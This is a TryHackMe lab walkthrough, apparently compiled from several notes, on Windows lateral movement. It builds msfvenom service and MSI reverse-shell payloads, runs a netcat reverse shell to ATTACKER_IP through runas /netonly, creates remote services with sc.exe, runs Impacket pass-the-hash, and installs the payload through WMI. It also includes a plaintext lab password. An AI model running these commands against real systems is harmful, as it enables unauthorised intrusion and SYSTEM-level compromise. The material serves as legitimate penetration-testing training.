The main thing to understand is that you are starting on `THMJMP2`, using credentials belonging to an account with administrative access on `THMIIS`, and using `sc.exe` to make `THMIIS` run a service payload.

You are not directly logging into `THMIIS` with Remote Desktop. You are moving laterally from one machine to another inside the Active Directory lab.

What just happened? You have access to the jump machine, but that does not automatically mean you can administer `THMIIS`. For the next steps, you will use the separate administrative credentials supplied by the lab.

### Step 3 — Create the service payload on your AttackBox

The walkthrough uses `msfvenom` to generate a Windows executable in service format.

Conceptually, the payload is configured to connect back to your AttackBox on port `4444`.

Why service format? Windows expects a service executable to communicate properly with the Service Control Manager. A regular reverse-shell executable may be terminated when launched as a service because it does not implement the expected service behavior.

The generated file is called `myservice.exe` in the example, but use a unique filename in a shared lab.

`C:\Windows\myservice.exe`

You are not uploading the file to `THMJMP2`; you are placing it on the target machine, `THMIIS`.

### Step 5 — Start the first listener: port 4444

The walkthrough's first listener waits on port `4444`.

Listener 1 — Port 4444

This listener is intended to receive the connection initiated by `myservice.exe` after the service starts on `THMIIS`.

At this stage, no connection should be expected until the payload executes.

### Step 6 — Why do you need `runas /netonly`?

This is the trickiest part of the exercise.

You initially have a command prompt on `THMJMP2`, but the `sc.exe` command must authenticate to `THMIIS` using the supplied administrative account.

The `sc.exe` syntax used in the walkthrough does not provide a username/password option.

Windows offers `runas /netonly`, which starts a process locally while using the supplied credentials for outbound network authentication.

In the lab's workflow:

- The new process runs on `THMJMP2`.
    
- Its outbound network authentication uses `t1_leonard.summers` credentials.
    
- It opens a reverse shell back to the AttackBox on port `4443`.
    

Why use another reverse shell? Because you connected to `THMJMP2` through SSH. A separate shell gives you an interactive command prompt running under the process created by `runas`, so you can issue commands from that context.

Important: `/netonly` does not validate the password immediately. Incorrect credentials may only become apparent when the process attempts to authenticate to a remote resource.

### Step 7 — Start the second listener: port 4443

Listener 2 — Port 4443

This listener receives the connection from `nc64.exe` running on `THMJMP2`. It gives you a command shell through which you can issue the remote service-management commands.

The two ports serve different purposes:

|Port|Purpose|Expected connecting machine|
|---|---|---|
|`4443`|Interactive shell created through `runas /netonly`|`THMJMP2`|
|`4444`|Reverse shell from the service payload|`THMIIS`|

This is why the walkthrough starts two listeners. They are not duplicates.

### Step 8 — Create the service remotely using `sc.exe`

From the second shell, the walkthrough creates a service on `THMIIS` and associates it with the executable uploaded earlier.

Conceptually, the command tells Windows:

1. Connect to the Service Control Manager on `THMIIS`.
    
2. Register a uniquely named service.
    
3. Configure it to launch `C:\Windows\myservice.exe`.
    
4. Start the service.
    

Windows then launches the service executable on `THMIIS`.

If the service initializes correctly and the network path back to your AttackBox is available, it can establish the reverse connection to port `4444`.

### Step 9 — Receive the target shell and find the flag

When the service payload connects successfully, the first listener should receive a shell originating from `THMIIS`.

You now have a command shell running on the target machine. The walkthrough expects you to use it to locate the flag on the desktop associated with `t1_leonard.summers`.

Remember that the shell's actual privileges depend on the service configuration and the security context in which the service runs.

## 1. What problem was `runas` solving?

You started here:

THMJMP2 — your SSH session

THMIIS — target machine

The issue was that `sc.exe` doesn't provide a normal `-u username -p password` option for its remote service-management commands.

So, how could you make `sc.exe` use the other account's credentials?

That is where `runas /netonly` came in.

## 2. What does `/netonly` actually do?

Your lab used a command conceptually like this:

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

Let's break it down:

|Part|Meaning|
|---|---|
|`runas`|Starts a process using specified credentials or a specified logon configuration|
|`/netonly`|Uses the supplied credentials for remote network authentication, rather than replacing the local logon identity|
|`/user:...`|Specifies the account whose credentials should be used for outgoing network authentication|
|`nc64.exe`|Starts Netcat|
|`-e cmd.exe`|Attaches a command prompt to the Netcat connection|
|`ATTACKER_IP 4443`|Connects the shell back to your AttackBox on port 4443|

The password is entered when `runas` prompts you.

Important distinction: `/netonly` does not make the process a local administrator on `THMJMP2`. It configures the credentials used for outbound network authentication.

## 3. Why did the lab need a second reverse shell?

You accessed `THMJMP2` through SSH. If you had simply launched another `cmd.exe` with `runas`, that new command prompt would have existed inside the remote Windows session, but it wouldn't necessarily have been accessible as an interactive terminal through your existing SSH connection.

The lab therefore used Netcat to create a second connection:

Your Kali / AttackBox

Listener on port 4443

THMJMP2

Netcat process started through `runas /netonly`

This connection provides an interactive command prompt and lets you issue commands using the new process's outbound network credentials.

From that shell, you could execute `sc.exe` against `THMIIS`.

## 4. What happens when `sc.exe` connects to THMIIS?

The flow is:

`sc.exe` runs on THMJMP2

Windows attempts remote authentication

The `/netonly` credentials are used for the outbound network connection.

THMIIS checks permissions

The account must have sufficient rights to manage services.

Remote service is created and started

The configured payload executes on THMIIS.

This is also why a mistyped password can be confusing: `/netonly` doesn't validate the credentials when it starts the process. The failure might appear later when `sc.exe` tries to authenticate to the target.

## 5. The most important distinction

|Question|Answer|
|---|---|
|Did `runas /netonly` move you to THMIIS?|No. The process still ran on THMJMP2.|
|Did it make you a local administrator on THMJMP2?|No.|
|What did it change?|The credentials available for outbound network authentication.|
|Why was it needed?|To let `sc.exe` authenticate to THMIIS using the supplied administrative account.|
|What actually executed the payload on THMIIS?|The remote Windows Service Control Manager started the configured service.|

Memory trick: `runas /netonly` = run locally, authenticate remotely with another account.

That is the central concept this exercise is teaching: using one machine as a jump host while using another account's network credentials to administer a different machine.

### **[Section 1: Initial Setup, Foothold on `THM-JMP2`, & Objective to Laterally Move to `THM-IIS`]**

Let’s get to work—our practical task begins here. Internally, if we want, we can simply perform Pass-the-Hash using PsExec, Impacket, or Evil-WinRM, as there are many utilities available. However, we first need to understand how Pass-the-Hash actually operates under the hood. For that reason, we will dive into the detailed mechanics step-by-step so everything becomes clear.

To start, you need to establish an SSH connection to the jump host **`THM-JMP2`**, through which we will move laterally to the target server **`THM-IIS`**. Logging into `THM-JMP2` via SSH, we use the provided domain account credentials for user **Damian Horton**. After entering the password, the SSH session authenticates successfully.

For this lab exercise, the scenario assumes you have already captured administrative credentials earlier in the engagement. If you take those credentials, calculate their NTLM hash, and execute PsExec directly, you instantly gain administrative access to the remote system. However, to truly understand what is happening in the background, we will execute the attack manually using detailed individual steps. Our plan is to use **`sc.exe`** to create a remote Windows service on **`THM-IIS`** that executes our uploaded payload binary and sends an interactive reverse shell back to our attacking machine.

---

### **[Section 2: Crafting a Service-Compatible Reverse Shell Payload with `msfvenom`]**

The lab instructions outline creating a reverse shell payload using `msfvenom`, but you must not generate a standard executable binary. Instead, you must generate a **service-compatible binary**. A standard, non-service executable behaves differently: when the Windows Service Control Manager starts it, the process terminates within a minute or two because it fails to respond to service control signals, breaking your reverse shell connection. Non-service executables are quickly killed by the Windows Service Control Manager, which is why you must specify a service binary format using the `-f` flag in `msfvenom` (such as `exe-service`).

We copy the `msfvenom` syntax and create a service binary. While the lab suggests the default name `MyService`, multiple users share this lab environment, so giving your binary a unique name prevents collisions. In this demonstration, the service is named **`TechHackerService`**. We configure `LPORT` to **`4444`** and set `LHOST` to our dedicated VPN IP address assigned on the Lateral Movement network segment. The payload used is a stageless 64-bit reverse shell (**`windows/x64/shell_reverse_tcp`**). Once generated, `msfvenom` outputs the standalone service executable.

---

### **[Section 3: Uploading the Service Binary over SMB via the `ADMIN$` Share]**

Next, we must upload the generated service binary to **`THM-IIS`** over the SMB protocol. This mirrors the exact underlying mechanism of PsExec: PsExec takes administrative credentials, authenticates over SMB, uploads a service binary into a remote directory, and then creates and starts a service to execute that binary. To accomplish this, the administrative share **`ADMIN$`** must be enabled and accessible, which maps directly to the remote `C:\Windows` directory.

We execute an `smbclient` command targeting the `ADMIN$` share of `THM-IIS` under the context of the captured Tier-1 administrative user, **Leonard Summers** (`T1_Leonard_Summers`). After authenticating with Leonard's password, we attempt to upload `TechHackerService.exe`.

During the initial attempt, the connection fails and the SSH session disconnects because another user reset the shared lab network. In TryHackMe labs, shared infrastructure frequently encounters instability and resets. After waiting for the virtual machines and domain controllers to boot back up and restore connectivity, we reconnect to `THM-JMP2` via SSH. Retrying the SMB upload command successfully transfers our service executable directly into the remote Windows system directory on `THM-IIS`.

---

### **[Section 4: Setting Up the Reverse Shell Listener & Avoiding Metasploit for Deep Learning]**

With the binary uploaded, we must start a netcat listener on our attacking host using `rlwrap nc -lvnp 4444` to catch the incoming connection. The port number must match the exact `LPORT` (`4444`) embedded inside our generated payload. At this moment, no connection arrives because the executable merely resides on disk and has not been configured or started as a service yet.

While the TryHackMe exercise demonstrates using Metasploit modules, we deliberately avoid Metasploit here to thoroughly understand the manual underlying concepts. Relying on Metasploit makes exploitation overly automated, whereas performing steps manually provides better practical skills and mirrors real-world penetration testing and certification exams like the OSCP, where Metasploit usage is strictly restricted.

---

### **[Section 5: Non-Interactive `runas` Execution via `nc64.exe` to Inject Tier-1 Admin Context]**

Now we must use `sc.exe` to register the service on the remote server, but `sc.exe` requires executing under the privileges of the Tier-1 administrative user rather than our current low-privileged user (Damian Horton). Standard execution of `runas.exe` spawns a brand new Command Prompt window in an interactive desktop session. Because our initial access on `THM-JMP2` is an SSH command-line terminal without an interactive GUI/RDP desktop, running standard `runas` would spawn a window in an unreachable graphical session with which we cannot interact.

To overcome this, we execute a **non-interactive `runas` command** that launches `nc64.exe` to establish a reverse shell back to our attacking machine:

- We start a second netcat listener on port **`4443`** on our Kali machine.
- From our SSH session on `THM-JMP2`, we execute `runas.exe /netonly` specifying domain user `T1_Leonard_Summers` and executing `C:\Tools\nc64.exe <ATTACKER_IP> 4443 -e cmd.exe`.
- When prompted, we supply Leonard Summers's password.

This command triggers a reverse shell connecting back to our port 4443 listener. Although running `whoami` in this shell still shows Damian Horton locally, all network connections initiated from this shell now authenticate across the domain under the memory-injected context of Tier-1 administrator Leonard Summers.

---

### **[Section 6: Creating and Starting the Remote Service on `THM-IIS` via `sc.exe`]**

From this network-authenticated shell, we now have the required permissions to manage remote services on `THM-IIS`. Using `sc.exe`, we create a remote service on `THM-IIS`:

```
sc.exe \\THM-IIS create 1111 binPath= "C:\Windows\TechHackerService.exe" start= auto
```

- **Target Server**: `\\THM-IIS`.
- **Service Name**: Configured as a unique string (`1111`) to prevent naming conflicts with other lab users.
- **Binary Path (`binPath`)**: Points to the uploaded malicious payload located at `C:\Windows\TechHackerService.exe`.

The console returns `[SC] CreateService SUCCESS`, verifying that the service was created successfully on the remote server.

Next, we start the newly registered service:

```
sc.exe \\THM-IIS start 1111
```

Executing this command instructs the remote Windows Service Control Manager on `THM-IIS` to launch the binary.

---

### **[Section 7: Catching the `NT AUTHORITY\SYSTEM` Shell & Demystifying Pass-the-Hash Internals]**

As soon as the service launches, an inbound connection hits our primary listener on port `4444`. Running `hostname` confirms that we have successfully gained remote shell execution on **`THM-IIS`**. Running `whoami` returns **`NT AUTHORITY\SYSTEM`**, demonstrating that we have obtained the highest possible administrative privileges on the target server.

This demonstrates the power of Windows services: when a service is registered and started under an administrative domain account, it executes under the `SYSTEM` context by default.

This entire manual sequence demystifies what actually happens under the hood during a Pass-the-Hash or PsExec attack:

1. An attacker crafts a service-compatible payload binary.
2. The binary is uploaded to the target server's administrative share (`ADMIN$`) using administrative credentials.
3. The attacker authenticates across the network using the administrative security context via `runas /netonly`.
4. The attacker uses `sc.exe` to create a remote service pointing to the uploaded binary.
5. Starting the service executes the binary, delivering a remote `SYSTEM` shell on port `4444`.

---

### **[Section 8: Automating Lateral Movement with Impacket's `psexec.py`]**

Having executed the attack manually, we now demonstrate how automated tools perform the exact same workflow in a single step. Using Impacket's **`psexec.py`**, we execute Pass-the-Hash directly from our attacking machine:

```
psexec.py za.tryhackme.com/T1_Leonard_Summers@thm-iis.za.tryhackme.com -hashes 00000000000000000000000000000000:<LEONARD_NT_HASH>
```

- You supply the domain name, target administrative username, and target server FQDN.
- The `-hashes` flag takes the LM and NT hash values. The LM hash is filled with zeros, while the NT hash is derived directly from Leonard Summers's password.

When executed, `psexec.py` connects to the `ADMIN$` share, uploads a randomized service binary, registers the service, starts it, and returns an interactive command prompt. Running `whoami` in the resulting shell returns `NT AUTHORITY\SYSTEM` on `THM-IIS`. Both the manual `sc.exe` method and Impacket's `psexec.py` accomplish the exact same outcome; tools simply automate the underlying manual process. # 2. Understand every PowerShell command

## Step 1 — Start PowerShell

```
powershell.exe
```

You were initially connected to `THMJMP2` through a Netcat shell. This command starts a PowerShell process inside that Windows session.

You now have access to PowerShell-specific commands and objects, including CIM cmdlets.

## Step 2 — Store the username

```
$username = 't1_corine.waters'
```

This creates a variable named `$username`.

The variable holds the account name that you will use to authenticate to the remote WMI service.

## Step 3 — Store the password

Your version used:

```
$password = 'Korine.1994'
```

This stores the password as a normal PowerShell string. It is simple, but it is less desirable for security because plaintext credentials may remain exposed in command history or process memory.

The alternative is to prompt for a secure string:

```
$password = Read-Host 'Enter lab password' -AsSecureString
```

Both approaches supply a password to the next step, but they store it differently.

## Step 4 — Convert the password to a SecureString

```
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
```

This converts the plaintext password into a PowerShell `SecureString`.

- `-AsPlainText` tells PowerShell that the input is currently plaintext.
    
- `-Force` confirms that you intentionally want to perform that conversion.
    

If you already used `Read-Host -AsSecureString`, you should use that secure value directly rather than converting it again.

## Step 5 — Create the credential object

```
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

A `PSCredential` object groups together the username and secure password.

Think of it as a credential package that PowerShell can pass to a remote-management command.

It does not authenticate you by itself. Authentication happens when a subsequent command attempts to use the credentials.

## Step 6 — Select the WMI connection protocol

```
$Opt = New-CimSessionOption -Protocol DCOM
```

This tells PowerShell to use DCOM as the transport for the remote CIM session.

WMI exposes Windows management information and operations. DCOM provides a way to communicate with the remote management service over RPC.

For this configuration, the network typically needs:

- TCP 135 for the RPC Endpoint Mapper.
    
- A dynamic RPC port for the actual remote service connection.
    

The alternative is WSMan, which uses WinRM, typically over TCP 5985 or 5986.

## Step 7 — Establish the remote CIM session

```
$Session = New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

This is the command that creates the remote management session.

|Argument|Purpose|
|---|---|
|`-ComputerName`|Specifies the remote machine|
|`-Credential`|Supplies the account credentials|
|`-SessionOption`|Applies the selected DCOM configuration|
|`-ErrorAction Stop`|Makes terminating errors stop the current operation|
|`$Session`|Stores the resulting session object|

After this succeeds, you have a reusable PowerShell object for making management requests to `THMIIS`.

Important: A CIM session is not a remote interactive shell. It is a management connection that allows you to query WMI classes and invoke their methods.

## Step 8 — Invoke the MSI installation method

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"
    Options = ""
    AllUsers = $false
}
```

This is the key operation in the exercise.

- `Invoke-CimMethod` calls a method on a remote WMI/CIM class.
    
- `-CimSession $Session` directs the request to `THMIIS`.
    
- `Win32_Product` represents products managed through Windows Installer.
    
- `-MethodName Install` requests an installation.
    
- `PackageLocation` identifies the MSI file on the remote machine.
    

That last point is important: `C:\Windows\myinstaller.msi` refers to the path on `THMIIS`, not the file on Kali or `THMJMP2`.

The request causes the target's Windows Installer machinery to attempt the installation. In your lab, the MSI was specially generated so that its execution establishes a reverse-shell connection.

## 4. Step 2 — Understand the MSI package

An `.msi` file is a Windows Installer package. It normally contains installation instructions and files for legitimate software.

In this exercise, the package is generated with a payload so that installing it can establish a reverse shell.

The walkthrough's command is:

```
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

The important arguments are:

- `-p windows/x64/shell_reverse_tcp`: selects a 64-bit Windows reverse-shell payload.
    
- `LHOST`: specifies the callback address reachable from the target.
    
- `LPORT=4445`: specifies the callback port.
    
- `-f msi`: requests MSI output format.
    
- `myinstaller.msi`: the resulting package filename.
    

Important: `lateralmovement` must resolve to the correct TryHackMe VPN or AttackBox callback address in your environment. The address shown in the walkthrough may differ from yours.

## 5. Step 3 — Transfer the package to THMIIS

The lab uploads the package to the target's administrative share.

The Windows `ADMIN$` share normally maps to `C:\Windows`, so a file uploaded to the root of that share becomes:

`C:\Windows\myinstaller.msi`

The important distinction is that the upload happens through SMB, whereas the later installation request happens through WMI.

SMB transfer

## 7. Step 5 — Install the package through WMI

This is the central step of the exercise.

```
Invoke-CimMethod `
    -CimSession $Session `
    -ClassName Win32_Product `
    -MethodName Install `
    -Arguments @{
        PackageLocation = "C:\Windows\myinstaller.msi"
        Options = ""
        AllUsers = $false
    }
```

Here's what each part means:

|Component|Explanation|
|---|---|
|`Invoke-CimMethod`|Calls a method on a remote WMI/CIM class or instance|
|`-CimSession $Session`|Uses the remote session established earlier|
|`Win32_Product`|Represents software products registered with Windows Installer|
|`-MethodName Install`|Requests a package installation|
|`PackageLocation`|Gives the location of the MSI on the target|
|`Options`|Supplies installation options|
|`AllUsers`|Controls the installation scope where supported|

If the request succeeds and the MSI installs and executes as intended, the payload can initiate a reverse connection to your handler.

One technical caveat: `Win32_Product` is a legacy WMI class and can trigger Windows Installer consistency checks. It is not generally recommended for routine software inventory or deployment.

## 8. Troubleshooting checklist

If the connection does not arrive, check the stages separately.

- Your assigned `t1_corine.waters` credentials are correct.
    
- The MSI was uploaded to the intended `THMIIS` path.
    
- The callback address is reachable from `THMIIS`.
    
- The handler's payload, address, and port match the generated package.
    
- The WMI session was created successfully.
    
- The installation method returned a successful result.
    
- The remote host's firewall and the lab network permit the callback.
    

Don't assume that a successful WMI method call guarantees that the package installed or that a reverse shell was established. Check the method's return value and the target's relevant logs.
